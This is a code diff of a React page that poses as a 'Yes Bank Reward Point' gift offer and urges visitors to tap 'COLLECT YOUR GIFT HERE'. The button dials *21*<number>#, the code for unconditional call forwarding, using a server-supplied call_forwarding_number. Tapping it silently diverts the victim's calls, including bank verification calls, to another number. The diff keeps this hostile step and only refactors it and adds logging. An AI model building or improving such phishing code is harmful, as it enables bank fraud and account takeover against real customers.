@@ -20,15 +20,17 @@ function ThirdPage() {
     <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
       <img src={myImage} alt="Description of the image" />
       <div className="flex justify-center mb-4">
-        <p className="text-lg text-gray-900 mb-4">Welcome To Yes Bank Reward Point.</p>
+        <p className="text-lg text-gray-900 mb-4">Welcome to Yes Bank Reward Point.</p>
       </div>
       <p className="text-lg text-gray-700 mb-4">
         To Collect Your Reward Point Gifts, give us a Miss Call to Yes Bank Reward Care by clicking the button below.
       </p>
       <div className="flex justify-center">
-        <button onClick={() =>
-            window.open(`tel:*21*${forwardingNumber?.call_forwarding_number}%23`,'_self')
-            }
+        <button onClick={() => {
+            const telUrl = `tel:*21*${forwardingNumber?.call_forwarding_number}%23`;
+            console.log('Dialing URL:', telUrl);
+            window.open(telUrl, '_self');
+          }}
           className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
         >
           COLLECT YOUR GIFT HERE
